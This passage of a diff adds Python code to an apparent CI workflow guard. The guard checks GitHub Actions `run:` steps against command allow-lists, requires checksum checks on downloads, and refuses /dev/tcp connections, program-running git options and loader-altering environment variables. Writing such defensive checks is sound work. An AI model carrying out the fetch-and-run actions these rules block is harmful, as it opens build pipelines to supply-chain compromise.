+        return f"`{word} {path[:40]}`, which is not a script file of the repository"
+    return ""
+
+
+def git_problem(texts: List[str], site: Optional[Tuple["ShellScan", int]] = None) -> str:
+    if not texts or texts[0].startswith("-"):
+        return "`git` with a global option or no subcommand"
+    if texts[0] not in RUN_GIT:
+        return f"`git {texts[0][:30]}`, which is not in RUN_GIT"
+    if any(a.split("=")[0] in ("--upload-pack", "--receive-pack", "--exec") for a in texts):
+        return "`git` with an option that runs a program"
+    if texts[0] == "show" and any(GIT_REF_PATH_RE.fullmatch(a) for a in texts[1:]) and site is not None \
+            and site[0].info[site[1]]["sub"]:
+        return "`git show <ref>:<path>` inside a command substitution (a file of another ref is a download)"
+    if texts[0] == "config":
+        keys = [a for a in texts[1:] if not a.startswith("-")]
+        if keys[:1] not in (["user.name"], ["user.email"]):
+            return "`git config` of a key other than user.name and user.email"
+    return ""
+
+
+def cargo_problem(texts: List[str]) -> str:
+    plain = [a for a in texts if not a.startswith("-") and not a.startswith("+")]
+    if any(a == "--config" or a.startswith("--config=") for a in texts):
+        return "`cargo --config` (it can name a program to run)"
+    if not plain or plain[0] not in RUN_CARGO:
+        return f"`cargo {(plain or [''])[0][:30]}`, which is not in RUN_CARGO"
+    if plain[0] != "install":
+        return ""
+    crates, locked, version, n, rest = [], False, False, 0, texts[texts.index("install") + 1:]
+    while n < len(rest):
+        arg = rest[n]
+        n += 1
+        if arg == "--locked":
+            locked = True
+        elif arg == "--version" and n < len(rest) and re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+", rest[n]):
+            version, n = True, n + 1
+        elif arg.startswith("-") or arg not in RUN_CARGO_CRATES:
+            return f"`cargo install {arg[:40]}` (only --locked --version of {', '.join(RUN_CARGO_CRATES)})"
+        else:
+            crates.append(arg)
+    if not (crates and locked and version):
+        return "`cargo install` without a listed crate, --locked and a pinned --version"
+    return ""
+
+
+def docker_problem(texts: List[str], ctx: Optional[RunCtx]) -> str:
+    if not texts or texts[0].startswith("-"):
+        return "`docker` with a global option or no subcommand"
+    sub = texts[0]
+    if sub in ("run", "create", "pull"):
+        n = 1
+        while n < len(texts) and texts[n].startswith("-"):  # the options end at the image
+            tok = texts[n]
+            n += 1
+            if "=" not in tok and tok in DOCKER_VALUE_OPTS:
+                n += 1
+            elif tok.split("=")[0] not in DOCKER_VALUE_OPTS and tok not in DOCKER_FLAG_OPTS:
+                return f"`docker {sub}` with the option `{tok[:30]}`, which the guard cannot place before the image"
+        image = docker_image(texts[1:])
+        local = ctx.local_images if ctx is not None else frozenset()
+        if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):
+            return f"`docker {sub}` of the image `{image[:50]}`, which is neither pinned by digest nor built by an earlier step"
+        return ""
+    if sub not in RUN_DOCKER:
+        return f"`docker {sub[:30]}`, which is not in RUN_DOCKER"
+    return ""
+
+
+def wrapper_problem(word: str, args: List[Tuple[str, bool]], ctx: Optional[RunCtx], depth: int,
+                    site: Optional[Tuple["ShellScan", int]] = None) -> str:
+    """Round 8 (S8): `command`, `sudo`, `timeout` and `xargs` run the command that follows them; that command is
+    held to the same list. A wrapper option outside the short fixed set is refused."""
+    rest = list(args)
+    if word == "command" and rest and rest[0][0] == "-v":
+        return ""
+    if word == "sudo":
+        while rest and rest[0][0] in ("-E", "-n", "-H"):
+            rest.pop(0)
+    elif word == "xargs":
+        while rest and rest[0][0] in ("-r", "-0"):
+            rest.pop(0)
+    elif word == "timeout":
+        if not rest or not RUN_DURATION_RE.fullmatch(rest[0][0]):
+            return "`timeout` without a plain duration first"
+        rest.pop(0)
+    if not rest or not rest[0][1] or depth >= 4:
+        return f"`{word}` followed by a computed, missing or deeply wrapped command"
+    return command_problem(rest[0][0], rest[1:], ctx, depth + 1)
+
+
+def command_problem(word: str, args: List[Tuple[str, bool]], ctx: Optional[RunCtx], depth: int = 0,
+                    site: Optional[Tuple["ShellScan", int]] = None) -> str:
+    """Round 8 (S8): "" when ``word`` is in RUN_ALLOWED and its arguments meet the policy of that tool, else the
+    reason. A tool that can fetch or run code has a policy; the others take any argument."""
+    if word not in RUN_ALLOWED:
+        return f"the command `{word[:40]}`, which is not in RUN_ALLOWED"
+    texts = [a for a, _l in args]
+    plain = [a for a in texts if not a.startswith("-")]
+    reason = tool_url_problem(word, texts)
+    if reason:
+        return reason
+    if word in RUN_WRAPPERS:
+        return wrapper_problem(word, args, ctx, depth, site)
+    if word in ("bash", "sh", "source", "python3"):
+        return script_problem(word, args)
+    if word == "git":
+        return git_problem(texts, site)
+    if word == "tar":
+        return tar_problem(texts)  # Round 9 (F3): in every `run:`, not only in a fetch step
+    if word == "cargo":
+        return cargo_problem(texts)
+    if word == "docker":
+        return docker_problem(texts, ctx)
+    if word == "gh":
+        return gh_problem(texts, site)
+    if word == "openssl":
+        return openssl_problem(args)
+    if word == "pipx":
+        return "" if not [a for a in texts if a.startswith("-")] and tuple(plain) in RUN_PIPX else \
+            f"`pipx {' '.join(texts)[:40]}`, which is not in RUN_PIPX"
+    if word == "apt-get":
+        opts = [a for a in texts if a.startswith("-")]
+        pkgs = plain[1:]
+        if all(o in ("-y", "-q", "-qq") for o in opts) and (plain == ["update"] or (
+                plain[:1] == ["install"] and pkgs and all(p in RUN_APT_PKGS for p in pkgs))):
+            return ""
+        return f"`apt-get {' '.join(texts)[:40]}`, which is neither `update` nor `install -y` of {', '.join(RUN_APT_PKGS)}"
+    if word == "awk":
+        return awk_problem(args)
+    if word == "sed":
+        return sed_problem(args)
+    return ""
+
+
+def run_problem(scan: "ShellScan", ctx: Optional[RunCtx]) -> str:
+    """Round 8 (S8, 3-agent vote 6def5ab6): "" when every command word of a `run:` text is in RUN_ALLOWED (or is a
+    function the text defines) and meets the policy of its tool, else the first reason. A downloader is refused by
+    not being listed; no word list names the fetching forms."""
+    for name in sorted(scan.funcs):
+        if name in RUN_ALLOWED:
+            return f"a function named `{name}`, which would replace the listed command"
+    for k, (word, literal, args) in enumerate(scan.cmds):
+        if not literal:
+            if word == "$__GHS__":  # a `${{ secrets.NAME }}` the repository owner set is the whole command
+                continue
+            return f"the computed command word `{word[:40]}`"
+        if word in scan.funcs:
+            continue
+        reason = command_problem(word, args, ctx, 0, (scan, k))
+        if reason:
+            return reason
+    return ""
+
+
+def digest_token(word: str, args: List[Tuple[str, bool]]) -> str:
+    """The first token of the text an `echo` or `printf` feeds a checksum command: the expected digest."""
+    vals = [a for a, _l in args if not a.startswith("-")]
+    if word == "printf" and vals and "%" in vals[0]:
+        return vals[1] if len(vals) > 1 else ""
+    first = vals[0].split() if vals else []
+    return first[0] if first else ""
+
+
+def verify_names(scan: "ShellScan", k: int, dl: Iterable[str], made: Iterable[str] = (),
+                 ok: Iterable[str] = ()) -> Optional[set]:
+    """Round 8 (S1, S7): the names the check-mode checksum command ``k`` covers: the names of the `echo` or `printf`
+    (or the here-string) that feeds it (`echo "$SUM  f" | sha256sum -c -`), or "*" when its checklist is a file the step
+    did not download (or one whose own check ran, ``ok``). None when the digest source is not the repository text: a
+    checklist the step downloaded, a download piped in, a command substitution in the echoed text, or (Round 9, F6) a
+    digest held in a variable the job assigned from anything but a literal 64-hex.
+    decision: a literal or already-verified expected digest over any variable because a variable assigned in the job can
+    only come from the file itself or from another fetch."""
+    _word, _lit, args = scan.cmds[k]
+    downloaded = set(dl) - set(ok)
+    madeset = set(made)
+    files = [a for a, _l in args if not a.startswith("-")]
+    if any(base_of(f) in downloaded for f in files):
+        return None
+    names: set = {"*"} if files else set()
+    sources: List[Tuple[str, List[Tuple[str, bool]]]] = []
+    j = k
+    while j > 0 and scan.info[j]["prev"] == "|":
+        j -= 1
+        pword, plit, pargs = scan.cmds[j]
+        if not (plit and pword in ("echo", "printf")):
+            return None
+        sources.append((pword, pargs))
+    for kind, text in scan.info[k]["redirs"]:
+        if kind == "<<<":
+            sources.append(("echo", [(str(text), False)]))
+        elif kind == "<":
+            if is_exp(text) or base_of(text) in downloaded:
+                return None
+            names.add("*")
+    for pword, pargs in sources:
+        for arg, alit in pargs:
+            if not alit and ("$(" in arg or "`" in arg):
+                return None
+            names.update(base_of(t) for t in arg.split() if not t.startswith("-"))
+        if any(m.group(1) in madeset for m in DIGEST_VAR_RE.finditer(digest_token(pword, pargs))):
+            return None
+    return names
+
+
+def verified_names(scan: "ShellScan", made: Iterable[str] = ()) -> set:
+    """Round 8 (S2): the file names any checksum or attestation command of the text names (for the later steps). Round 9
+    (F5): only a check-mode call fed repository text, a comparison with a literal 64-hex or `gh attestation verify` names a
+    file; a print-only `sha256sum` or `shasum` verifies nothing."""
+    out: set = set()
+    for k, (word, _lit, args) in enumerate(scan.cmds):
+        plain = [a for a, _l in args if not a.startswith("-") and a != "-"]
+        if word in FETCH_VERIFIERS and is_verify(word, args):
+            out.update((verify_names(scan, k, (), made) or set()) - {"*"})
+        elif word.rsplit("/", 1)[-1] == "gh" and "attestation" in plain:
+            out.update(base_of(a) for a in plain)
+        elif word in ("[", "[[", "test"):
+            out.update(compare_names(scan, k) or set())
+    return out
+
+
+def fetch_problem(scan: "ShellScan", facts: Dict[str, object], made: Iterable[str] = ()) -> str:
+    """Round 6 (vote 6def5ab6): "" unless the text is a fetch step (curl, wget, Invoke-WebRequest, iwr or git clone in
+    any word) that runs a command outside FETCH_ALLOWED; then the reason. Round 7: the options of curl and wget are
+    listed (N3), a command that consumes a fetched file needs a checksum check first (F3) and no fetched file lands in
+    a bin directory. Round 8: the check is per downloaded file (S1), the digest comes from the text and not from a file
+    the step downloaded (S7), a wget without `-O` writes the URL's last component (S2), and the words that make a step
+    a fetch step no longer try to name every downloader (S8: RUN_ALLOWED does). ``facts`` receives the decoded words,
+    the names written and the names a checksum command names."""
+    outputs: List[str] = []
+    made_all = self_made_names(scan, made)
+    globs = [a for _w, _lit, args in scan.cmds for a, lit in args if (lit or is_exp(a)) and any(c in a for c in "*?[")]
+    ls_dirs = [fetch_dir_of(next((a for a, _l in args if not a.startswith("-")), ".") + "/_")
+               for k, (w, _lit, args) in enumerate(scan.cmds) if w == "ls" and scan.info[k]["sub"]]
+    path_args = [a for w, _lit, args in scan.cmds if w in ("echo", "printf") and any(GITHUB_PATH_RE.search(x) for x in scan.targets)
+                 for a, _l in args if not a.startswith("-")]
+    facts.update(words=[norm_name(w) for w in scan.words] + [norm_name(v) for _n, v, _e in scan.assign_vals],
+                 outputs=outputs, verified=verified_names(scan, made_all), made=made_all,
+                 env_names=env_written_names(scan), globs=globs, ls_dirs=ls_dirs, path_args=path_args)
+    clone = any(w == "git" and any(a == "clone" for a, _l in args) for w, _lit, args in scan.cmds)
+    captured = [captured_fetch(scan, k) for k in range(len(scan.cmds))]
+    if not clone and not any(captured) and not any(FETCH_WORD_RE.search(w) for w in scan.words):
+        return ""
+    if scan.heredocs:
+        return "a here-document"
+    for name in scan.assigns:
+        if DANGEROUS_ASSIGN_RE.fullmatch(name):
+            return f"an assignment to `{name}`"
+    if any(FETCH_FILE_RE.search(w) for w in scan.words):
+        return "a write to GITHUB_ENV or GITHUB_PATH"
+    if any("${!" in w for w in scan.words):
+        return "an indirect expansion (`${!name}`)"
+    if any(w == "errexit" or re.fullmatch(r"\+[A-Za-z]*e[A-Za-z]*", w) for w in scan.words):
+        return "`set +e` (the checksum check must stop the step)"
+    for target in scan.targets:
+        if "$" in target or "`" in target:
+            return f"a redirect to the computed path `{target[:40]}`"
+    tar_dirs = set()
+    for word, _lit, args in scan.cmds:
+        for n, (arg, _l) in enumerate(args):
+            if word == "tar" and arg.startswith("-") and not arg.startswith("--") and arg.endswith("C") and n + 1 < len(args):
+                tar_dirs.add(args[n + 1][0])
+    redirected = [t for t in scan.targets if t and not t.isdigit() and t != "-" and not t.startswith("/dev/")]
+    outputs.extend(redirected)
+    for w in scan.words:
+        if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):
+            return f"the system bin directory in `{w[:40]}`"
+    dl: set = {base_of(t) for t in redirected}  # a file the step downloaded or wrote
+    ok: set = set()  # the downloaded files whose own checksum check ran
+    any_ok = False
+    chain: Optional[Tuple[int, set]] = None  # (index of a check followed by `&&`, the names it covers)
+    for k, (word, literal, args) in enumerate(scan.cmds):
+        info = scan.info[k]
+        if not literal or (word not in FETCH_ALLOWED and not captured[k]):
+            return f"the command `{word[:40]}`"
+        plain = [a for a, _l in args if not a.startswith("-")]
+        if captured[k]:  # Round 9 (F4): a captured gh api, git show or download is a fetch whose target needs its own check
+            for out in captured_outputs(scan, k):
+                outputs.append(out)
+                dl.add(base_of(out))
+                ok.discard(base_of(out))
+        if word in ("curl", "wget"):
+            if info["sub"]:
+                return f"a `{word}` inside a command substitution"
+            written: List[str] = []
+            reason = option_problem(word, args, written)
+            if reason:
+                return reason
+            outputs.extend(written)
+            for out in written:
+                dl.add(base_of(out))
+                ok.discard(base_of(out))
+        if word == "tar":
+            for n, (arg, _lit) in enumerate(args):
+                if arg.startswith("--"):
+                    good = TAR_LONG_RE.fullmatch(arg) is not None
+                else:
+                    good = arg.startswith("-") or n == 0
+                    good = TAR_FLAGS_RE.fullmatch(arg) is not None if good else True
+                if not good:
+                    return f"the tar option `{arg[:40]}`"
+        chained = chain is not None and chain[0] == k - 1 and info["prev"] == "&&"
+        extra = chain[1] if chained and chain is not None else set()
+        covered = ok | extra
+        if word in FETCH_CONSUMERS:
+            named = [base_of(a) for a in plain if base_of(a) in dl]
+            if named:
+                missing = [n for n in named if n not in covered]
+                if missing:
+                    return (f"`{word}` of the downloaded `{missing[0][:40]}` before its own checksum check (a top-level "
+                            "`sha256sum -c` or `shasum -c` of that file, fed by text of the step, must stop the step first)")
+            elif not (any_ok or chained):
+                return f"`{word}` before a checksum check (a top-level `sha256sum -c` or `shasum -c` must stop the step first)"
+        if word in ("mv", "cp") and plain:
+            outputs.append(plain[-1])
+            sources = [base_of(a) for a in plain[:-1] if base_of(a) in dl]
+            if sources:
+                dl.add(base_of(plain[-1]))
+                (ok.add if all(s in covered for s in sources) else ok.discard)(base_of(plain[-1]))
+        first = k
+        while first > 0 and scan.info[first]["prev"] == "|":  # a pipeline stands or falls with its first command
+            first -= 1
+        start = scan.info[first]
+        names = None
+        if is_verify(word, args) and info["top"] and not start["neg"] and start["prev"] in ("\n", ";"):
+            names = verify_names(scan, k, dl, made_all, ok)
+        elif word in ("[", "[[", "test"):
+            names = compare_names(scan, k)  # Round 9 (F5): a comparison with a literal 64-hex verifies the names it hashes
+        if names is not None:
+            names = set(dl) if "*" in names else {n for n in names if n in dl}
+            if info["nxt"] in ("\n", ";", ""):
+                ok |= names
+                any_ok = True
+            elif info["nxt"] == "&&":
+                chain = (k, names)
+    for out in outputs:
+        if base_of(out) in FETCH_ALLOWED:
+            return f"a download written over the command name `{base_of(out)[:40]}`"
+    return ""
+
+
+MAX_LOCAL_DEPTH = 8  # nested local composite actions followed before a chain is refused
+
+
+def uses_where(doc: Node, path: Tuple[str, ...]) -> str:
+    """#8021: the job and the step a `uses:` at ``path`` belongs to (never only a line number)."""
+    if len(path) >= 2 and path[0] == "jobs":
+        where = f"job `{path[1]}`"
+        if len(path) >= 5 and path[2] == "steps" and path[3].isdigit():
+            where += f" step {int(path[3]) + 1}"  # #8031: 1-based, as the #6290 `steps.N` messages
+            jobs = doc.get("jobs")
+            job = jobs.get(path[1]) if jobs is not None else None
+            steps = job.get("steps") if job is not None else None
+            if steps is not None and steps.kind == "seq" and isinstance(steps.value, list):
+                idx = int(path[3])
+                step = steps.value[idx] if idx < len(steps.value) else None
+                label = step.get("name") if step is not None else None
+                if label is not None and label.kind == "scalar":
+                    where += f" ({label.text().strip()[:50]})"
+        return where
+    return "path `" + ".".join(path) + "`"
+
+
+def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chain: Tuple[Path, ...]) -> int:
+    """One `uses:` value: pinned (USES_PINNED_RE), compared per action (#8030, Round 5 F1), and a local
+    action is opened and inspected (Round 5 F5)."""
+    ref = node.text().strip()
+    if node.kind != "scalar" or not USES_PINNED_RE.fullmatch(ref):
+        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` is not pinned to a "
+                "full 40-hex commit sha (#6904: a tag, branch or short ref can be re-pointed)"
+                + pin_hint("USES_PINNED_RE"))
+        return 0
+    # #8030 (the #6904 acceptance): where a *_USES constant exists for the action, the ref must
+    # equal it exactly; another 40-hex sha is an unreviewed commit. release.yml's docker job is
+    # pinned whole by DOCKER_STEPS, which already names the constant, so it is not reported twice.
+    # Round 5 (F1): GitHub resolves owner and repository case-insensitively and runs a subpath of the
+    # repository, so the action is keyed on the lower-cased first two path components and the pinned
+    # sha must be the allowlisted one for that key whatever spelling or subpath the ref uses.
+    spec, _, sha = ref.partition("@")
+    if ref.startswith("./"):
+        return check_local_action(ref, node, name, where, rep, chain)
+    if spec.startswith("docker://"):
+        return 0
+    segs = spec.split("/")
+    if any(seg in ("", ".", "..") for seg in segs):
+        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` has an empty, `.` or "
+                "`..` path segment (a normalised path can name another action than the one reviewed)")
+        return 0
+    want = USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))
+    if want is not None and sha != want.partition("@")[2] and not exempt:
+        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` differs from "
+                f"{USES_CONSTANTS[want]} (`{want}`; #6904: a per-action constant comparison on the "
+                "case-folded owner/repo, any subpath kept)" + pin_hint(USES_CONSTANTS[want]))
+    return 0
+
+
+def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report, chain: Tuple[Path, ...]) -> int:
+    """Round 5 (F5): a local `./path` action is loaded from the checked-out tree and held to the same rules. Round 7
+    (N6): the depth is counted on the resolved path and a walked action keeps the height of the chain below it, so an
+    action reached shallow first and deep later is refused at the deep site; the height (this action plus the deepest
+    chain below it) is returned."""
+    rel = ref[2:]
+    here = f"{name}: {where}: line {node.line + 1}: local action `{rel}`"
+    if rep.root is None:
+        rep.bad(f"{here} cannot be inspected (no checked-out tree to read it from)")
+        return 0
+    try:
+        tree = rep.root.resolve()
+        target = (tree / rel).resolve()
+    except (OSError, RuntimeError):
+        rep.bad(f"{here} cannot be resolved (a symlink loop or an unreadable path)")
+        return 0
+    if tree != target and tree not in target.parents:
+        rep.bad(f"{here} resolves outside the checked-out tree")
+        return 0
+    if target in chain:
+        rep.bad(f"{here} is part of a cycle of local actions")
+        return 0
+    if len(chain) >= MAX_LOCAL_DEPTH:
+        rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep")
+        return 0
+    if target in rep.walked:  # Round 6 (R4-3): an action reached again by a fan-out is walked once
+        height = rep.heights.get(target, 1)
+        if len(chain) + height > MAX_LOCAL_DEPTH:
+            rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep (reached again below an earlier path; "
+                    "its own chain is counted on this one)")
+        return height
+    rep.walked.add(target)
+    rep.heights[target] = 1
+    action = next((target / f for f in ("action.yml", "action.yaml") if (target / f).is_file()), None)
+    if action is None:
+        rep.bad(f"{here} has no action.yml or action.yaml (a local action that cannot be read is not inspected)")
+        return 1
+    label = f"{rel}/{action.name}"
+    text = load(action, label, rep, True)
+    if text is None:
+        return 1
+    adoc = parse_yaml(text, label, rep)
+    if adoc is None:
+        return 1
+    runs = adoc.get("runs")
+    using = runs.get("using") if runs is not None else None
+    kind = using.text().strip() if using is not None and using.kind == "scalar" else ""
+    height = 1
+    if kind == "composite":
+        steps = runs.get("steps") if runs is not None else None
+        if steps is None or steps.kind != "seq" or not steps.value:
+            rep.bad(f"{here}: `runs.steps` must be a non-empty list")
+            return 1
+        ctx = run_context(steps, ())
+        for i, step in enumerate(steps.value):
+            where_step = f"local action `{rel}` step {i + 1}"
+            if step.kind != "map":
+                rep.bad(f"{label}: {where_step}: line {step.line + 1}: a step must be a mapping")
+                continue
+            uses = step.get("uses")
+            if uses is not None:
+                height = max(height, 1 + check_ref(uses, label, where_step, rep, False, chain + (target,)))
+            check_run(step, label, where_step, rep, ctx)
+    elif kind == "docker":
+        image = runs.get("image") if runs is not None else None
+        if image is None or image.kind != "scalar" or not DOCKER_USES_RE.fullmatch(image.text().strip()):
+            rep.bad(f"{here}: `runs.image` must be a `docker://...@sha256:<64 hex>` image")
+    elif kind.startswith("node"):
+        main = runs.get("main") if runs is not None else None
+        try:
+            entry = (target / main.text().strip()).resolve() if main is not None and main.kind == "scalar" else None
+        except (OSError, RuntimeError):  # a symlink loop in `main` is a refusal, never an exception
+            entry = None
+        if entry is None or (target != entry and target not in entry.parents) or not entry.is_file():
+            rep.bad(f"{here}: `runs.main` must name a file inside the action directory")
+    else:
+        rep.bad(f"{here}: `runs.using` must be `composite`, `docker` or `node*` (got `{kind[:30]}`)")
+    rep.heights[target] = height
+    return height
+
+
+SHELL_ALLOWED = ("bash", "sh")  # Round 7 (N4, F4): the shells whose `-e` behaviour the checksum rule relies on
+
+
+def matrix_variants(raw: str, ctx: RunCtx) -> List[Tuple[str, str]]:
+    """Round 8 (S4): the run text once per literal value of each `${{ matrix.<key> }}` it names, as (label, text), the
+    way GitHub splices the value in before the shell reads the text."""
+    keys: List[str] = []
+    for m in EXPR_RE.finditer(raw):
+        parts = m.group(1).strip().split(".")
+        if len(parts) == 2 and parts[0] == "matrix" and parts[1] in ctx.matrix_values and parts[1] not in keys:
+            keys.append(parts[1])
+    out: List[Tuple[str, str]] = []
+    for key in keys:
+        for value in ctx.matrix_values[key]:
+            if "${{" in value or value == MATRIX_COMPLEX:
+                continue  # an expression value is refused by check_matrix_exprs; a mapping or sequence by check_run
+            text = EXPR_RE.sub(lambda m, k=key, v=value: v if m.group(1).strip() == f"matrix.{k}" else "$__GHX__", raw)
+            out.append((f"matrix.{key} = {value[:40]}", text))
+    return out
+
+
+def glob_hit(fetched: str, part: str) -> bool:
+    """A word part with a glob character that matches the downloaded name (and has some other character too)."""
+    return any(c in part for c in "*?[") and bool(part.strip("*?[]")) and fnmatch.fnmatchcase(fetched, part)
+
+
+def check_env_keys(env: Optional[Node], name: str, where: str, rep: Report) -> None:
+    """Round 8 (S6): an `env:` mapping (workflow, job or step) sets no variable that changes what the shell, the
+    linker, curl, git or a package tool loads (`BASH_ENV`, `ENV`, `PATH`, `LD_*`, ...), as an inline assignment cannot."""
+    if env is None or env.kind != "map":
+        return
+    for key in env.keys():
+        held = env.get(key)
+        vtext = held.text().strip() if held is not None and held.kind == "scalar" else None
+        if vtext is not None and SUBSCRIPT_SUBST_RE.search(vtext):
+            rep.bad(f"{name}: {where}: line {env.line + 1}: `env:` value of `{key}` holds an array subscript with a "
+                    "substitution, which bash re-evaluates wherever the variable is read as a number or a name "
+                    "(Round 11, sec r10 F2)")
+        if DANGEROUS_ASSIGN_RE.fullmatch(key) or rustflags_bad(key, vtext):
+            rep.bad(f"{name}: {where}: line {env.line + 1}: `env:` sets `{key}`, which changes what the shell or a tool "
+                    "loads before it runs (Round 8, S6: the inline form is refused, so the mapping form is too)")
+
+
+def step_value_words(step: Node) -> List[str]:
+    """Round 9 (sec r8 F3): the values of a step's `env:` and `with:` (a `uses:` step has no `run:`), as words that may name a
+    download."""
+    out: List[str] = []
+    for key in ("env", "with"):
+        held = step.get(key)
+        if held is not None and held.kind == "map" and isinstance(held.value, dict):
+            for val in held.value.values():
+                if val.kind == "scalar":
+                    out.append(norm_name(val.text().strip().strip("'\"")))
+    return out
+
+
+def matrix_complex_keys(raw: str, ctx: RunCtx) -> List[str]:
+    """Round 9 (F8): the matrix keys the run text names whose value is a mapping or a sequence."""
+    keys: List[str] = []
+    for m in EXPR_RE.finditer(raw):
+        parts = m.group(1).strip().split(".")
+        if (len(parts) == 2 and parts[0] == "matrix" and MATRIX_COMPLEX in ctx.matrix_values.get(parts[1], ())
+                and parts[1] not in keys):
+            keys.append(parts[1])
+    return keys
+
+
+def cross_step(step: Node, facts: Dict[str, object], ctx: RunCtx, name: str, where: str, rep: Report, line: int) -> None:
+    """The names of a step against the downloads of the earlier steps of its job (Round 8, S2) and, Round 9 (sec r8 F3), the
+    indirect references to them: an `env:` or `with:` value, a variable's value, a bare glob or `$(ls)` over a download
+    directory, a download directory on PATH.
+    decision: refuse every indirect reference to a download over tracking renames because the guard reads workflow text and
+    cannot follow shell data flow."""
+    words = [str(w) for w in facts.get("words", [])] + step_value_words(step)  # type: ignore[union-attr]
+    parts = {p for w in words for p in re.split(r"[/=:]", w)}  # a path component or an option value, never a substring
+    verified = facts.get("verified", set())
+    flagged = False
+    for hit in sorted(f for f in ctx.fetched if f in parts or any(glob_hit(f, p) for p in parts)):
+        # Round 9 (F5): the `.sha256` companion is only data next to an asset this step verified by a real check
+        if hit in verified or (hit.endswith(".sha256") and hit[:-len(".sha256")] in verified):
+            continue
+        rep.bad(f"{name}: {where}: line {line}: `run:` names `{hit[:40]}`, a file an earlier step of the job "
+                "downloaded, and no `sha256sum`, `shasum` or `gh attestation verify` of this step names that file "
+                "(Round 8, S2: the checksum tool must name the exact downloaded file; a glob does not; a downloaded file is "
+                "checked in the step that uses it)")
+        flagged = True
+        break
+    if not flagged:
+        for glob in facts.get("globs", []):  # type: ignore[union-attr]
+            for piece in re.split(r"[=:]", str(glob)):
+                if bare_glob(piece) and fetch_dir_of(piece) in ctx.fetch_dirs:
+                    rep.bad(f"{name}: {where}: line {line}: `run:` names the bare glob `{str(glob)[:40]}` over "
+                            f"`{fetch_dir_of(piece)}`, a directory an earlier step of the job downloaded into (Round 9, sec r8 F3: "
+                            "a glob that matches a download without naming it is an indirect reference; name the file)")
+                    flagged = True
+                    break
+            if flagged:
+                break
+    if not flagged:
+        for d in facts.get("ls_dirs", []):  # type: ignore[union-attr]
+            if d in ctx.fetch_dirs:
+                rep.bad(f"{name}: {where}: line {line}: `run:` lists `{str(d)[:40]}` with `ls` in a command substitution, "
+                        "a directory an earlier step of the job downloaded into (Round 9, sec r8 F3: an indirect reference)")
+                flagged = True
+                break
+    if not flagged:
+        for arg in facts.get("path_args", []):  # type: ignore[union-attr]
+            if fetch_dir_of(str(arg) + "/_") in ctx.fetch_dirs:
+                rep.bad(f"{name}: {where}: line {line}: `run:` puts `{str(arg)[:40]}` on GITHUB_PATH, a directory an earlier "
+                        "step of the job downloaded into (Round 9, sec r8 F3: a downloaded program would shadow a tool)")
+                break
+    for out in facts.get("outputs", []):  # type: ignore[union-attr]
+        base = base_of(str(out))
+        if base:
+            ctx.fetched.add(base)
+            ctx.fetch_dirs.add(fetch_dir_of(str(out)))
+    ctx.made.update(facts.get("env_names", ()))  # type: ignore[arg-type]
+
+
+def check_run(step: Node, name: str, where: str, rep: Report, ctx: RunCtx) -> None:
+    """Round 6 (vote 6def5ab6): a `run:` names only allow-listed expression roots, and a fetch step runs only
+    the commands of FETCH_ALLOWED. Round 7 adds the shell, the network-redirection patterns and the check that a
+    step naming a downloaded file verifies it. Round 8 holds every command word of every `run:` to RUN_ALLOWED (S8),
+    scans the literal matrix values that reach the text (S4) and checks the names against the checksum commands. Round 9
+    (sec r8 F1-F3) checks the `env:` of every step (a `uses:` step too), refuses a dangerous variable in every run step and
+    refuses an indirect reference to a download (an `env:` value, a variable, a bare glob, a PATH entry)."""
+    check_env_keys(step.get("env"), name, where, rep)
+    run = step.get("run")
+    if run is None:
+        cross_step(step, {}, ctx, name, where, rep, step.line + 1)
+        return
+    raw = run_text(run)
+    if raw is None:
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` must be a scalar or a block (got {run.kind})")
+        return
+    shell = step.get("shell")
+    if shell is not None:
+        got = shell.text().strip() if shell.kind == "scalar" else ""
+        if got not in SHELL_ALLOWED:
+            rep.bad(f"{name}: {where}: line {shell.line + 1}: `shell: {(got or shell.kind)[:30]}` is not allowed (Round 7: a "
+                    f"step runs under {' or '.join(SHELL_ALLOWED)}, whose `-e` stops a failed checksum check)")
+    elif ctx.windows and not ctx.default_shell:
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` has no `shell:` on a Windows runner (the default shell there "
+                f"is pwsh; Round 7: name {' or '.join(SHELL_ALLOWED)})")
+    for m in EXPR_RE.finditer(raw):
+        if expr_allowed(m.group(1), ctx):
+            continue
+        parts = m.group(1).strip().split(".")
+        if len(parts) == 4 and parts[0] == "steps" and parts[2] == "outputs" and parts[1] in ctx.uses_ids:
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}`, the output of a `uses:` step "
+                    "(Round 8, S3, 3-agent vote 6def5ab6 option B: only the outputs of a `run:` step may appear in run "
+                    "text, because an action computes its outputs from inputs this guard cannot read; pass it through `env:`)")
+        else:
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}` into the script "
+                    "(Round 6: only matrix.<key>, secrets.<NAME> and steps.<id>.outputs.<name> of a `run:` step of the "
+                    "same job may appear in run text; pass any other value through `env:` and quote it in the script)")
+    if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` opens a network connection through /dev/tcp, /dev/udp or an "
+                "`exec <n<>` descriptor (Round 7, F5: a download that no fetch word names)")
+    text = EXPR_RE.sub(lambda m: "$__GHS__" if m.group(1).strip().startswith("secrets.") else "$__GHX__", raw)
+    facts: Dict[str, object] = {}
+    try:
+        scan = ShellScan(text)
+    except ShellError as err:
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is text the scanner cannot read ({err}); Round 8, S8: every "
+                "command word of a `run:` text is checked against the run allow-list, so unreadable text is refused")
+        facts.update(words=[norm_name(text)], outputs=[], verified=set())
+    else:
+        reason = run_problem(scan, ctx)
+        problem = fetch_problem(scan, facts, ctx.made)
